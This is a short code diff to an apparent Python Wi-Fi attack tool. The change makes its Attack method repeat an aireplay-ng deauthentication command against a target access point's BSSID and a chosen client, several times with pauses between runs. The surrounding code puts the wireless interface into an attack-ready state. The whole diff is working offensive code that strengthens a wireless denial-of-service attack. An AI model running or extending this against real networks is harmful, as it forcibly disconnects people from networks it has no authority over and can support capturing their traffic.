@@ -16,6 +16,7 @@ class Engine(object):
   self.mode  = mode
   self.chan  = channel
   self.delay = 180 if mode == 'S' else 60
+  self.attk  = 5   if mode == 'S' else 2
 
  def Monitor(self):
   call(['ifconfig',self.wlan,'down'])
@@ -45,8 +46,9 @@ class Engine(object):
  def Attack(self,client):
   print '[-] Attack: {}'.format(client)
   cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
-  Popen(cmd,stdout=Devnull,stderr=Devnull).wait()
-  time.sleep(.7)
+  for i in range(self.attk):
+   Popen(cmd,stdout=Devnull,stderr=Devnull).wait()
+   time.sleep(10)
 
 def from_file_to_list(file):
  list=[]
